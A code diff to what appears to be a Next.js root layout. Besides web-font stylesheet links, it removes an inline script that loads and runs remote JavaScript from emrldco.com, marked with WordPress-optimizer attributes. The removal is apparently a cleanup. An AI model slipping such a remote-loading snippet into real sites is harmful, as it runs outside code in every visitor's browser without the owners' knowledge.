@@ -42,16 +42,6 @@ export default function RootLayout({
         <link rel="stylesheet" href="https://cdn.web-fonts.ge/fonts/bpg-arial/css/bpg-arial.min.css" />
         <link rel="stylesheet" href="https://cdn.web-fonts.ge/fonts/bpg-glaho/css/bpg-glaho.min.css" />
         <link rel="stylesheet" href="https://cdn.web-fonts.ge/fonts/bpg-nino-mtavruli-bold/css/bpg-nino-mtavruli-bold.min.css" />
-     
-<script data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrldco.com/NTEwNTAw.js?t=510500';
-      document.head.appendChild(script);
-  })();
-</script>
-
       </head>
       <body className="antialiased bg-white text-slate-800">
         <Header />
